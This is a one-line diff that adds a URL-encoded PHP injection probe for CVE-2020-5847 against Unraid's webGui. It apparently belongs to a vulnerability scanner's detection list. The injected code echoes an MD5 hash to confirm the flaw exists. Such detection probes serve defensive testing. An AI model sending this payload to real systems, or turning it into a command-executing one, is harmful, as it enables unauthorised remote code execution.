@@ -1,0 +1,1 @@
+/webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20echo%20md5(%22CVE-2020-5847%22);%20?%3E
